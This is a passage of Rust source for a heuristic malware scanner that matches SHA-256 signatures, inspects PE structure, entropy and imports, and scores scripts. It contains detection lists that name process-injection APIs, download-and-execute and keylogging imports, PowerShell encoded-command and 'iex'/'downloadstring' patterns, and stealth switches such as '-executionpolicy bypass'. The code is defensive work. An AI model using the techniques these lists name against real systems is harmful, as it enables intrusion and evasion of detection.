use goblin::pe::PE;
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, HashSet};
use std::fmt;
use std::fs::File;
use std::io::Read;
use std::path::Path;

pub const BLACKSHARD_SELF_TEST_SHA256: &str =
    "e316cf90429b8ac181a7006de57c3f4af0c75642caf24589b86f63c8798294f8";

const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;
const DEFAULT_MAX_READ_BYTES: usize = 64 * 1024 * 1024;
const DEFAULT_SCRIPT_SAMPLE_BYTES: usize = 1024 * 1024;
const DEFAULT_SUSPICIOUS_THRESHOLD: u8 = 55;
const MIN_SECTION_ENTROPY_BYTES: usize = 4 * 1024;
const HIGH_ENTROPY_THRESHOLD: f64 = 7.35;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Verdict {
    Clean,
    Suspicious,
    Malicious,
    Error,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ScriptLanguage {
    PowerShell,
    Batch,
    JavaScript,
    VisualBasic,
    Shell,
    Python,
    Generic,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ContentType {
    Empty,
    Pe32,
    Pe64,
    PeUnknown,
    Script(ScriptLanguage),
    Text,
    Pdf,
    Zip,
    Gzip,
    SevenZip,
    Rar,
    OleCompound,
    Elf,
    MachO,
    Binary,
    Unknown,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AnalysisCompleteness {
    Complete,

    PrefixOnly,
    PrefixAndTargetedRegions,
    ResourceLimitReached,
    ChangedDuringScan,
    TimedOut,
    UnsupportedFormat,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum EvidenceSeverity {
    Informational,
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Evidence {
    pub code: &'static str,
    pub severity: EvidenceSeverity,
    pub risk_points: u8,
    pub description: String,
}

#[derive(Debug, Clone, PartialEq)]
pub struct ScanReport {
    pub verdict: Verdict,
    pub content_type: ContentType,
    pub risk_score: u8,

    pub confidence: u8,
    pub sha256: Option<String>,
    pub file_size: u64,
    pub bytes_scanned: usize,
    pub truncated: bool,
    pub analysis_completeness: AnalysisCompleteness,
    pub entropy: f64,
    pub evidence: Vec<Evidence>,
    pub error: Option<String>,
}

impl ScanReport {
    fn error(message: impl Into<String>, file_size: u64, bytes_scanned: usize) -> Self {
        let message = message.into();
        Self {
            verdict: Verdict::Error,
            content_type: ContentType::Unknown,
            risk_score: 0,
            confidence: 0,
            sha256: None,
            file_size,
            bytes_scanned,
            truncated: false,
            analysis_completeness: AnalysisCompleteness::ResourceLimitReached,
            entropy: 0.0,
            evidence: vec![Evidence {
                code: "scan.io_error",
                severity: EvidenceSeverity::High,
                risk_points: 0,
                description: message.clone(),
            }],
            error: Some(message),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScanConfig {
    pub max_read_bytes: usize,

    pub max_script_sample_bytes: usize,

    pub suspicious_threshold: u8,
}

impl Default for ScanConfig {
    fn default() -> Self {
        Self {
            max_read_bytes: DEFAULT_MAX_READ_BYTES,
            max_script_sample_bytes: DEFAULT_SCRIPT_SAMPLE_BYTES,
            suspicious_threshold: DEFAULT_SUSPICIOUS_THRESHOLD,
        }
    }
}

impl ScanConfig {
    pub fn validate(&self) -> Result<(), ConfigError> {
        if self.max_read_bytes == 0 || self.max_read_bytes == usize::MAX {
            return Err(ConfigError("max_read_bytes must be in 1..usize::MAX"));
        }
        if self.max_script_sample_bytes == 0 {
            return Err(ConfigError("max_script_sample_bytes must be non-zero"));
        }
        if self.suspicious_threshold == 0 || self.suspicious_threshold > 100 {
            return Err(ConfigError("suspicious_threshold must be in 1..=100"));
        }
        Ok(())
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ConfigError(&'static str);

impl fmt::Display for ConfigError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(self.0)
    }
}

impl std::error::Error for ConfigError {}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExactSignature {
    pub name: String,
    pub family: Option<String>,
    pub automatic_quarantine_eligible: bool,
}

#[derive(Debug, Clone)]
pub struct SignatureDatabase {
    exact_sha256: BTreeMap<[u8; 32], ExactSignature>,
    compact_sha256: Vec<[u8; 32]>,
    compact_prefix_offsets: Vec<u32>,
    compact_signature: Option<ExactSignature>,
}

impl Default for SignatureDatabase {
    fn default() -> Self {
        let mut database = Self::empty();
        database
            .insert_sha256_hex(
                BLACKSHARD_SELF_TEST_SHA256,
                "blackshard-harmless-self-test",
                Some("Test".to_owned()),
            )
            .expect("the built-in blackshard self-test digest is valid");
        database
    }
}

impl SignatureDatabase {
    pub fn empty() -> Self {
        Self {
            exact_sha256: BTreeMap::new(),
            compact_sha256: Vec::new(),
            compact_prefix_offsets: Vec::new(),
            compact_signature: None,
        }
    }

    pub fn len(&self) -> usize {
        self.exact_sha256.len() + self.compact_sha256.len()
    }

    pub fn is_empty(&self) -> bool {
        self.exact_sha256.is_empty() && self.compact_sha256.is_empty()
    }

    pub fn insert_sha256_hex(
        &mut self,
        digest: &str,
        name: impl Into<String>,
        family: Option<String>,
    ) -> Result<Option<ExactSignature>, SignatureError> {
        let digest = parse_sha256_hex(digest)?;
        Ok(self.exact_sha256.insert(
            digest,
            ExactSignature {
                name: name.into(),
                family,
                automatic_quarantine_eligible: true,
            },
        ))
    }

    pub fn lookup(&self, digest: &[u8; 32]) -> Option<&ExactSignature> {
        if let Some(signature) = self.exact_sha256.get(digest) {
            return Some(signature);
        }
        let prefix = usize::from(u16::from_be_bytes([digest[0], digest[1]]));
        let offsets = self.compact_prefix_offsets.get(prefix..=prefix + 1)?;
        let start = offsets[0] as usize;
        let end = offsets[1] as usize;
        self.compact_sha256[start..end]
            .binary_search(digest)
            .ok()
            .and(self.compact_signature.as_ref())
    }

    pub fn replace_compact_sha256(
        &mut self,
        digests: Vec<[u8; 32]>,
        name: impl Into<String>,
        family: Option<String>,
    ) -> Result<(), SignatureError> {
        if digests.windows(2).any(|window| window[0] >= window[1]) {
            return Err(SignatureError(
                "compact SHA-256 corpus must be strictly sorted and unique".to_owned(),
            ));
        }
        if digests.len() > u32::MAX as usize {
            return Err(SignatureError(
                "compact SHA-256 corpus exceeds the index capacity".to_owned(),
            ));
        }

        let mut offsets = vec![0u32; 65_537];
        for digest in &digests {
            let prefix = usize::from(u16::from_be_bytes([digest[0], digest[1]]));
            offsets[prefix + 1] += 1;
        }
        for index in 1..offsets.len() {
            offsets[index] += offsets[index - 1];
        }

        self.compact_sha256 = digests;
        self.compact_prefix_offsets = offsets;
        self.compact_signature = Some(ExactSignature {
            name: name.into(),
            family,
            automatic_quarantine_eligible: false,
        });
        Ok(())
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SignatureError(pub String);

impl fmt::Display for SignatureError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(&self.0)
    }
}

impl std::error::Error for SignatureError {}

#[derive(Debug, Clone, Default)]
pub struct ScanEngine {
    config: ScanConfig,
    signatures: SignatureDatabase,
}

impl ScanEngine {
    pub fn new(config: ScanConfig, signatures: SignatureDatabase) -> Result<Self, ConfigError> {
        config.validate()?;
        Ok(Self { config, signatures })
    }

    pub fn config(&self) -> &ScanConfig {
        &self.config
    }

    pub fn signatures(&self) -> &SignatureDatabase {
        &self.signatures
    }

    pub fn scan_path(&self, path: impl AsRef<Path>) -> ScanReport {
        let path = path.as_ref();
        let file = match File::open(path) {
            Ok(file) => file,
            Err(error) => {
                return ScanReport::error(
                    format!("could not open {}: {error}", path.display()),
                    0,
                    0,
                )
            }
        };
        let declared_size = file.metadata().ok().map(|metadata| metadata.len());
        self.scan_reader(file, declared_size)
    }

    pub fn scan_reader<R: Read>(&self, reader: R, declared_size: Option<u64>) -> ScanReport {
        let mut hasher = Sha256::new();
        let mut prefix = Vec::with_capacity(
            declared_size
                .unwrap_or(0)
                .min(self.config.max_read_bytes as u64) as usize,
        );
        let mut buffer = [0u8; 64 * 1024];
        let mut total_read = 0u64;
        let mut io_error = None;

        let limit = self.config.max_read_bytes as u64 + 1;
        let mut bounded_reader = reader.take(limit);

        loop {
            let n = match bounded_reader.read(&mut buffer) {
                Ok(0) => break,
                Ok(n) => n,
                Err(error) => {
                    io_error = Some(error);
                    break;
                }
            };
            hasher.update(&buffer[..n]);

            if prefix.len() < self.config.max_read_bytes {
                let needed = self.config.max_read_bytes - prefix.len();
                let to_copy = n.min(needed);
                prefix.extend_from_slice(&buffer[..to_copy]);
            }
            total_read += n as u64;
        }

        if let Some(ref error) = io_error {
            if prefix.is_empty() {
                return ScanReport::error(
                    format!("could not read candidate: {error}"),
                    declared_size.unwrap_or(total_read),
                    0,
                );
            }
        }

        let file_size = declared_size
            .map(|size| size.max(total_read))
            .unwrap_or(total_read);
        let truncated_prefix = total_read > self.config.max_read_bytes as u64;
        let full_digest = if io_error.is_none() && !truncated_prefix {
            Some(hasher.finalize().into())
        } else {
            None
        };

        let completeness = if io_error.is_some() {
            AnalysisCompleteness::ResourceLimitReached
        } else if truncated_prefix {
            AnalysisCompleteness::PrefixOnly
        } else {
            AnalysisCompleteness::Complete
        };

        self.analyze_internal(
            &prefix,
            file_size,
            prefix.len(),
            truncated_prefix,
            full_digest,
            completeness,
        )
    }

    pub fn scan_bytes(&self, bytes: &[u8]) -> ScanReport {
        self.scan_sample(bytes, bytes.len() as u64)
    }

    pub fn scan_sample(&self, bytes: &[u8], declared_size: u64) -> ScanReport {
        let sample = &bytes[..bytes.len().min(self.config.max_read_bytes)];
        let file_size = declared_size.max(bytes.len() as u64);
        let truncated_prefix =
            bytes.len() > self.config.max_read_bytes || file_size > bytes.len() as u64;

        let full_digest = (!truncated_prefix).then(|| sha256(bytes));
        let completeness = if truncated_prefix {
            AnalysisCompleteness::PrefixAndTargetedRegions
        } else {
            AnalysisCompleteness::Complete
        };

        self.analyze_internal(
            sample,
            file_size,
            bytes.len(),
            truncated_prefix,
            full_digest,
            completeness,
        )
    }

    /// Analyses `sample`, the start of a file of `file_size` bytes, whose whole-file SHA-256 the
    /// caller has already computed by streaming the entire file.
    ///
    /// The expensive analysis stays bounded by the sample, but signature lookups use the real
    /// digest, so padding a known sample past the read limit no longer hides it.
    pub fn scan_sample_with_digest(
        &self,
        sample: &[u8],
        file_size: u64,
        whole_file_sha256: [u8; 32],
    ) -> ScanReport {
        let sample = &sample[..sample.len().min(self.config.max_read_bytes)];
        let file_size = file_size.max(sample.len() as u64);
        let truncated = file_size > sample.len() as u64;
        self.analyze_internal(
            sample,
            file_size,
            sample.len(),
            truncated,
            Some(whole_file_sha256),
            if truncated {
                AnalysisCompleteness::PrefixAndTargetedRegions
            } else {
                AnalysisCompleteness::Complete
            },
        )
    }

    fn analyze_internal(
        &self,
        bytes: &[u8],
        file_size: u64,
        bytes_scanned: usize,
        truncated: bool,
        full_digest: Option<[u8; 32]>,
        analysis_completeness: AnalysisCompleteness,
    ) -> ScanReport {
        let entropy = shannon_entropy(bytes);
        let mut content_type = classify_content(bytes, self.config.max_script_sample_bytes);
        let sha256 = full_digest.as_ref().map(hex_sha256);
        let mut evidence = Vec::new();
        let mut exact_match = false;

        if let Some(digest) = &full_digest {
            if let Some(signature) = self.signatures.lookup(digest) {
                exact_match = true;
                let family = signature
                    .family
                    .as_deref()
                    .map(|family| format!(" ({family})"))
                    .unwrap_or_default();
                push_evidence(
                    &mut evidence,
                    if signature.automatic_quarantine_eligible {
                        "signature.exact_sha256"
                    } else {
                        "signature.reputation_sha256"
                    },
                    EvidenceSeverity::Critical,
                    100,
                    format!("matched exact signature {}{family}", signature.name),
                );
            }
        } else {
            push_evidence(
                &mut evidence,
                "scan.truncated",
                EvidenceSeverity::Informational,
                0,
                format!(
                    "file exceeded the {}-byte scan limit; whole-file signatures were skipped",
                    self.config.max_read_bytes
                ),
            );
        }

        match content_type {
            ContentType::Pe32 | ContentType::Pe64 | ContentType::PeUnknown => {
                analyze_pe(bytes, file_size, &mut content_type, &mut evidence)
            }
            ContentType::Script(_) => {
                analyze_script(bytes, self.config.max_script_sample_bytes, &mut evidence)
            }
            ContentType::Pdf => analyze_pdf(bytes, &mut evidence),
            _ => {
                if entropy >= HIGH_ENTROPY_THRESHOLD && bytes.len() >= MIN_SECTION_ENTROPY_BYTES {
                    push_evidence(
                        &mut evidence,
                        "entropy.high_uncontextualized",
                        EvidenceSeverity::Informational,
                        0,
                        format!(
                            "high overall entropy ({entropy:.2}); not risky without corroboration"
                        ),
                    );
                }
            }
        }

        let heuristic_score = evidence
            .iter()
            .filter(|item| item.code != "signature.exact_sha256")
            .fold(0u16, |total, item| {
                total.saturating_add(item.risk_points as u16)
            })
            .min(100) as u8;
        let risk_score = if exact_match { 100 } else { heuristic_score };
        let verdict = if exact_match {
            Verdict::Malicious
        } else if heuristic_score >= self.config.suspicious_threshold {
            Verdict::Suspicious
        } else {
            Verdict::Clean
        };
        let confidence = verdict_confidence(
            verdict,
            heuristic_score,
            self.config.suspicious_threshold,
            truncated,
            &evidence,
        );

        ScanReport {
            verdict,
            content_type,
            risk_score,
            confidence,
            sha256,
            file_size,
            bytes_scanned,
            truncated,
            analysis_completeness,
            entropy,
            evidence,
            error: None,
        }
    }
}

pub fn shannon_entropy(bytes: &[u8]) -> f64 {
    if bytes.is_empty() {
        return 0.0;
    }
    let mut frequencies = [0usize; 256];
    for &byte in bytes {
        frequencies[byte as usize] += 1;
    }
    let length = bytes.len() as f64;
    frequencies
        .iter()
        .filter(|&&count| count != 0)
        .map(|&count| {
            let probability = count as f64 / length;
            -probability * probability.log2()
        })
        .sum()
}

fn sha256(bytes: &[u8]) -> [u8; 32] {
    Sha256::digest(bytes).into()
}

fn hex_sha256(digest: &[u8; 32]) -> String {
    use std::fmt::Write;
    let mut encoded = String::with_capacity(64);
    for byte in digest {
        write!(&mut encoded, "{byte:02x}").expect("writing to a String cannot fail");
    }
    encoded
}

fn parse_sha256_hex(value: &str) -> Result<[u8; 32], SignatureError> {
    if value.len() != 64 {
        return Err(SignatureError(
            "a SHA-256 digest must contain exactly 64 hexadecimal characters".to_owned(),
        ));
    }
    let mut digest = [0u8; 32];
    for (index, pair) in value.as_bytes().as_chunks::<2>().0.iter().enumerate() {
        let high = hex_nibble(pair[0]).ok_or_else(|| {
            SignatureError(format!(
                "invalid hexadecimal digit at position {}",
                index * 2
            ))
        })?;
        let low = hex_nibble(pair[1]).ok_or_else(|| {
            SignatureError(format!(
                "invalid hexadecimal digit at position {}",
                index * 2 + 1
            ))
        })?;
        digest[index] = (high << 4) | low;
    }
    Ok(digest)
}

fn hex_nibble(byte: u8) -> Option<u8> {
    match byte {
        b'0'..=b'9' => Some(byte - b'0'),
        b'a'..=b'f' => Some(byte - b'a' + 10),
        b'A'..=b'F' => Some(byte - b'A' + 10),
        _ => None,
    }
}

fn classify_content(bytes: &[u8], text_limit: usize) -> ContentType {
    if bytes.is_empty() {
        return ContentType::Empty;
    }
    if bytes.starts_with(b"MZ") {
        return match PE::parse(bytes) {
            Ok(pe) if pe.is_64 => ContentType::Pe64,
            Ok(_) => ContentType::Pe32,
            Err(_) => ContentType::PeUnknown,
        };
    }
    if bytes.starts_with(b"%PDF-") {
        return ContentType::Pdf;
    }
    if bytes.starts_with(b"PK\x03\x04")
        || bytes.starts_with(b"PK\x05\x06")
        || bytes.starts_with(b"PK\x07\x08")
    {
        return ContentType::Zip;
    }
    if bytes.starts_with(&[0x1f, 0x8b]) {
        return ContentType::Gzip;
    }
    if bytes.starts_with(&[0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c]) {
        return ContentType::SevenZip;
    }
    if bytes.starts_with(b"Rar!\x1a\x07\x00") || bytes.starts_with(b"Rar!\x1a\x07\x01\x00") {
        return ContentType::Rar;
    }
    if bytes.starts_with(&[0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]) {
        return ContentType::OleCompound;
    }
    if bytes.starts_with(b"\x7fELF") {
        return ContentType::Elf;
    }
    if bytes.len() >= 4 {
        let magic = u32::from_be_bytes(bytes[..4].try_into().expect("four-byte slice"));
        if matches!(magic, 0xfeedface | 0xfeedfacf | 0xcefaedfe | 0xcffaedfe) {
            return ContentType::MachO;
        }
    }

    let sample = &bytes[..bytes.len().min(text_limit)];
    if let Some(text) = decode_probable_text(sample) {
        let lower = text.to_ascii_lowercase();
        if let Some(language) = identify_script_language(&lower) {
            ContentType::Script(language)
        } else {
            ContentType::Text
        }
    } else {
        ContentType::Binary
    }
}

fn decode_probable_text(bytes: &[u8]) -> Option<String> {
    if bytes.is_empty() {
        return Some(String::new());
    }
    if bytes.starts_with(&[0xff, 0xfe]) || looks_utf16_le(bytes) {
        let start = usize::from(bytes.starts_with(&[0xff, 0xfe]));
        let start = start * 2;
        let units: Vec<u16> = bytes[start..]
            .as_chunks::<2>()
            .0
            .iter()
            .map(|pair| u16::from_le_bytes(*pair))
            .collect();
        let text = String::from_utf16_lossy(&units);
        return is_probable_text(&text).then_some(text);
    }
    let text = std::str::from_utf8(bytes)
        .ok()?
        .trim_start_matches('\u{feff}');
    is_probable_text(text).then(|| text.to_owned())
}

fn looks_utf16_le(bytes: &[u8]) -> bool {
    if bytes.len() < 8 {
        return false;
    }
    let pairs = bytes.as_chunks::<2>().0.iter().take(256);
    let mut total = 0usize;
    let mut zero_high = 0usize;
    for pair in pairs {
        total += 1;
        if pair[1] == 0 && pair[0] != 0 {
            zero_high += 1;
        }
    }
    total >= 4 && zero_high * 100 / total >= 60
}

fn is_probable_text(text: &str) -> bool {
    if text.is_empty() {
        return true;
    }
    let mut acceptable = 0usize;
    let mut total = 0usize;
    for character in text.chars().take(4096) {
        total += 1;
        if !character.is_control() || matches!(character, '\n' | '\r' | '\t') {
            acceptable += 1;
        }
    }
    total != 0 && acceptable * 100 / total >= 90
}

fn identify_script_language(lower: &str) -> Option<ScriptLanguage> {
    if lower.starts_with("#!") {
        let first_line = lower.lines().next().unwrap_or_default();
        if first_line.contains("powershell") || first_line.contains("pwsh") {
            return Some(ScriptLanguage::PowerShell);
        }
        if first_line.contains("python") {
            return Some(ScriptLanguage::Python);
        }
        if first_line.contains("sh") {
            return Some(ScriptLanguage::Shell);
        }
        return Some(ScriptLanguage::Generic);
    }
    if contains_any(
        lower,
        &[
            "invoke-expression",
            "invoke-webrequest",
            "write-output",
            "new-object ",
            "get-childitem",
            "set-executionpolicy",
            "$env:",
            "param(",
        ],
    ) {
        return Some(ScriptLanguage::PowerShell);
    }
    if contains_any(lower, &["@echo off", "setlocal", "%~dp0", "cmd.exe /c"]) {
        return Some(ScriptLanguage::Batch);
    }
    if contains_any(
        lower,
        &[
            "wscript.createobject",
            "createobject(\"wscript",
            "sub main",
            "end sub",
        ],
    ) {
        return Some(ScriptLanguage::VisualBasic);
    }
    if contains_any(
        lower,
        &["function ", "=>", "document.", "require(", "wscript."],
    ) && contains_any(lower, &["var ", "let ", "const ", "function ", "wscript."])
    {
        return Some(ScriptLanguage::JavaScript);
    }
    None
}

/// `bytes` is all of the file, or for a file over the read limit only its first part; `file_size`
/// is the size of the whole file. A large, perfectly valid binary must not look malformed because
/// its sections or directories run past the part that was read.
fn analyze_pe(
    bytes: &[u8],
    file_size: u64,
    content_type: &mut ContentType,
    evidence: &mut Vec<Evidence>,
) {
    let truncated = file_size > bytes.len() as u64;
    let pe = match PE::parse(bytes) {
        Ok(pe) => pe,
        Err(error) if truncated => {
            push_evidence(
                evidence,
                "pe.unparsed_prefix",
                EvidenceSeverity::Informational,
                0,
                format!(
                    "the first {} bytes of this {file_size}-byte PE could not be parsed on their own: {error}",
                    bytes.len()
                ),
            );
            *content_type = ContentType::PeUnknown;
            return;
        }
        Err(error) => {
            *content_type = ContentType::PeUnknown;
            if let Some(kind) = legacy_executable_kind(bytes) {
                // 16-bit Windows and OS/2 programs ship with Windows itself (compobj.dll and
                // others); they are not malformed, just not PE.
                push_evidence(
                    evidence,
                    "pe.legacy_executable",
                    EvidenceSeverity::Informational,
                    0,
                    format!("MZ file is a {kind} executable, not a PE image"),
                );
            } else if pe_headers_are_plausible(bytes) {
                // The headers are sound but a table behind them did not parse: some real
                // programs (installers, launchers) have an odd directory. Not enough alone.
                push_evidence(
                    evidence,
                    "pe.structure_unreadable",
                    EvidenceSeverity::Low,
                    30,
                    format!("PE headers are valid but a directory could not be read: {error}"),
                );
            } else {
                push_evidence(
                    evidence,
                    "pe.malformed",
                    EvidenceSeverity::High,
                    55,
                    format!("MZ-marked file is not a structurally valid PE image: {error}"),
                );
            }
            return;
        }
    };
    *content_type = if pe.is_64 {
        ContentType::Pe64
    } else {
        ContentType::Pe32
    };

    if pe.sections.is_empty() {
        push_evidence(
            evidence,
            "pe.no_sections",
            EvidenceSeverity::High,
            35,
            "PE image has no sections".to_owned(),
        );
    } else if pe.sections.len() > 32 {
        push_evidence(
            evidence,
            "pe.excessive_sections",
            EvidenceSeverity::Medium,
            15,
            format!("PE image has an unusual {} sections", pe.sections.len()),
        );
    }

    let mut entry_section_found = pe.entry == 0;
    let mut executable_high_entropy = false;
    let mut packed_section_name = false;
    let mut last_raw_end = 0usize;

    for section in &pe.sections {
        let name = section
            .name()
            .unwrap_or_default()
            .trim_matches('\0')
            .to_ascii_lowercase();
        let executable = section.characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
        let writable = section.characteristics & IMAGE_SCN_MEM_WRITE != 0;
        let virtual_start = section.virtual_address as usize;
        let virtual_span = (section.virtual_size as usize).max(section.size_of_raw_data as usize);
        let entry = pe.entry as usize;
        if entry >= virtual_start && entry < virtual_start.saturating_add(virtual_span) {
            entry_section_found = true;
            if writable {
                push_evidence(
                    evidence,
                    "pe.entrypoint_writable",
                    EvidenceSeverity::High,
                    20,
                    format!("entry point lies in writable section {name:?}"),
                );
            }
        }

        if executable && writable {
            push_evidence(
                evidence,
                "pe.writable_executable_section",
                EvidenceSeverity::Medium,
                18,
                format!("section {name:?} is both writable and executable"),
            );
        }

        if is_packer_section_name(&name) {
            packed_section_name = true;
            push_evidence(
                evidence,
                "pe.packer_section_name",
                EvidenceSeverity::Medium,
                20,
                format!("section name {name:?} is associated with executable packers"),
            );
        }

        let raw_start = section.pointer_to_raw_data as usize;
        let raw_size = section.size_of_raw_data as usize;
        let Some(raw_end) = raw_start.checked_add(raw_size) else {
            push_evidence(
                evidence,
                "pe.invalid_section_bounds",
                EvidenceSeverity::High,
                25,
                format!("section {name:?} has overflowing raw bounds"),
            );
            continue;
        };
        last_raw_end = last_raw_end.max(raw_end);
        if raw_end > bytes.len() && raw_end as u64 <= file_size {
            // In the file, just beyond the part that was read.
            continue;
        }
        if raw_end > bytes.len() {
            push_evidence(
                evidence,
                "pe.invalid_section_bounds",
                EvidenceSeverity::High,
                25,
                format!("section {name:?} extends beyond the available file data"),
            );
            continue;
        }
        if executable && raw_size >= MIN_SECTION_ENTROPY_BYTES {
            let entropy = shannon_entropy(&bytes[raw_start..raw_end]);
            if entropy >= HIGH_ENTROPY_THRESHOLD {
                executable_high_entropy = true;
                push_evidence(
                    evidence,
                    "pe.high_entropy_executable_section",
                    EvidenceSeverity::Medium,
                    15,
                    format!("executable section {name:?} has high entropy ({entropy:.2})"),
                );
            }
        }
    }

    if !entry_section_found {
        push_evidence(
            evidence,
            "pe.entrypoint_outside_sections",
            EvidenceSeverity::High,
            25,
            "entry point does not lie in any declared section".to_owned(),
        );
    }

    if last_raw_end < bytes.len() {
        let overlay_size = bytes.len() - last_raw_end;
        if overlay_size >= 1024 * 1024
            && overlay_size * 100 / bytes.len().max(1) >= 30
            && (packed_section_name || executable_high_entropy)
        {
            push_evidence(
                evidence,
                "pe.large_overlay_with_packing",
                EvidenceSeverity::Low,
                8,
                format!("packed-looking PE has a {}-byte overlay", overlay_size),
            );
        }
    }

    analyze_pe_imports(&pe, evidence);
}

fn new_header_offset(bytes: &[u8]) -> Option<usize> {
    let raw = bytes.get(0x3c..0x40)?;
    let offset = u32::from_le_bytes(raw.try_into().ok()?) as usize;
    (offset >= 0x40).then_some(offset)
}

/// The kind of a non-PE "new executable" behind a DOS header, when its signature says so.
fn legacy_executable_kind(bytes: &[u8]) -> Option<&'static str> {
    let offset = new_header_offset(bytes)?;
    match bytes.get(offset..offset.checked_add(2)?)? {
        b"NE" => Some("16-bit Windows (NE)"),
        b"LE" | b"LX" => Some("OS/2 or VxD (LE/LX)"),
        _ => None,
    }
}

/// Whether the PE signature, COFF header and section table fit in the file and agree with each
/// other, so a failure to read a directory behind them says little.
fn pe_headers_are_plausible(bytes: &[u8]) -> bool {
    let Some(offset) = new_header_offset(bytes) else {
        return false;
    };
    let Some(coff) = bytes.get(offset..offset.saturating_add(24)) else {
        return false;
    };
    if &coff[..4] != b"PE\0\0" {
        return false;
    }
    let sections = u16::from_le_bytes([coff[6], coff[7]]) as usize;
    let optional = u16::from_le_bytes([coff[20], coff[21]]) as usize;
    let table_end = offset
        .saturating_add(24)
        .saturating_add(optional)
        .saturating_add(sections.saturating_mul(40));
    (1..=96).contains(&sections) && optional >= 96 && table_end <= bytes.len()
}

fn analyze_pe_imports(pe: &PE<'_>, evidence: &mut Vec<Evidence>) {
    let imports: HashSet<String> = pe
        .imports
        .iter()
        .map(|import| import.name.to_ascii_lowercase())
        .collect();

    analyze_import_set(&imports, evidence);
}

fn analyze_import_set(imports: &HashSet<String>, evidence: &mut Vec<Evidence>) {
    if imports.is_empty() {
        push_evidence(
            evidence,
            "pe.no_imports",
            EvidenceSeverity::Low,
            6,
            "PE image has no resolved imports; this can indicate static linking or packing"
                .to_owned(),
        );
    }

    let injection_stages = [
        has_import(imports, &["virtualallocex", "ntallocatevirtualmemory"]),
        has_import(imports, &["writeprocessmemory", "ntwritevirtualmemory"]),
        has_import(
            imports,
            &[
                "createremotethread",
                "ntcreatethreadex",
                "queueuserapc",
                "setthreadcontext",
            ],
        ),
    ]
    .into_iter()
    .filter(|present| *present)
    .count();
    if injection_stages >= 2 {
        let points = if injection_stages == 3 { 38 } else { 25 };
        push_evidence(
            evidence,
            "pe.process_injection_capability",
            EvidenceSeverity::High,
            points,
            format!("imports cover {injection_stages} distinct process-injection stages"),
        );
    }

    let downloads = has_import(
        imports,
        &[
            "urldownloadtofilea",
            "urldownloadtofilew",
            "internetreadfile",
            "winhttpreaddata",
            "wininetreadfile",
        ],
    );
    let executes = has_import(
        imports,
        &[
            "createprocessa",
            "createprocessw",
            "winexec",
            "shellexecutea",
            "shellexecutew",
        ],
    );
    if downloads && executes {
        push_evidence(
            evidence,
            "pe.download_and_execute_capability",
            EvidenceSeverity::Medium,
            22,
            "imports combine download and process-execution capabilities".to_owned(),
        );
    }

    if has_import(imports, &["getasynckeystate", "getkeystate"])
        && has_import(
            imports,
            &[
                "setwindowshookexa",
                "setwindowshookexw",
                "getforegroundwindow",
            ],
        )
    {
        push_evidence(
            evidence,
            "pe.input_capture_capability",
            EvidenceSeverity::Medium,
            18,
            "imports combine keyboard-state and input-hook/window-tracking APIs".to_owned(),
        );
    }

    let anti_debug_count = [
        "isdebuggerpresent",
        "checkremotedebuggerpresent",
        "ntqueryinformationprocess",
        "outputdebugstringa",
        "outputdebugstringw",
    ]
    .iter()
    .filter(|name| imports.contains(**name))
    .count();
    if anti_debug_count >= 2 {
        push_evidence(
            evidence,
            "pe.anti_debug_cluster",
            EvidenceSeverity::Low,
            10,
            format!("imports contain {anti_debug_count} anti-debugging APIs"),
        );
    }
}

fn has_import(imports: &HashSet<String>, names: &[&str]) -> bool {
    names.iter().any(|name| imports.contains(*name))
}

fn is_packer_section_name(name: &str) -> bool {
    matches!(
        name,
        "upx0"
            | "upx1"
            | "upx2"
            | ".upx0"
            | ".upx1"
            | ".packed"
            | ".aspack"
            | ".adata"
            | ".vmp0"
            | ".vmp1"
            | ".themida"
    )
}

fn analyze_script(bytes: &[u8], sample_limit: usize, evidence: &mut Vec<Evidence>) {
    let sample = &bytes[..bytes.len().min(sample_limit)];
    let Some(text) = decode_probable_text(sample) else {
        return;
    };
    let lower = text.to_ascii_lowercase();

    let has_encoded_command = contains_any(
        &lower,
        &["-encodedcommand", "-encoded command", "frombase64string("],
    ) || (contains_any(&lower, &["powershell", "pwsh"])
        && contains_long_base64_token(&text, 200));
    if has_encoded_command {
        push_evidence(
            evidence,
            "script.encoded_payload",
            EvidenceSeverity::Medium,
            22,
            "script contains an encoded-command or long decoded payload pattern".to_owned(),
        );
    }

    let expression_execution = contains_any(
        &lower,
        &[
            "invoke-expression",
            "iex(",
            "eval(",
            "execute(",
            "executeglobal(",
        ],
    );
    let network_fetch = contains_any(
        &lower,
        &[
            "downloadstring(",
            "downloadfile(",
            "invoke-webrequest",
            "invoke-restmethod",
            "xmlhttp",
            "winhttp.winhttprequest",
            "http://",
            "https://",
        ],
    );
    if expression_execution && network_fetch {
        push_evidence(
            evidence,
            "script.download_and_execute",
            EvidenceSeverity::High,
            42,
            "script combines network retrieval with dynamic expression execution".to_owned(),
        );
    } else if expression_execution && has_encoded_command {
        push_evidence(
            evidence,
            "script.decode_and_execute",
            EvidenceSeverity::High,
            34,
            "script combines encoded content with dynamic expression execution".to_owned(),
        );
    }

    let stealth_switches = [
        "-executionpolicy bypass",
        "-windowstyle hidden",
        "-noninteractive",
        "-noprofile",
    ]
    .iter()
    .filter(|switch| lower.contains(**switch))
    .count();
    if stealth_switches >= 2 {
        push_evidence(
            evidence,
            "script.stealth_switch_cluster",
            EvidenceSeverity::Medium,
            15,
            format!("script combines {stealth_switches} PowerShell stealth/bypass switches"),
        );
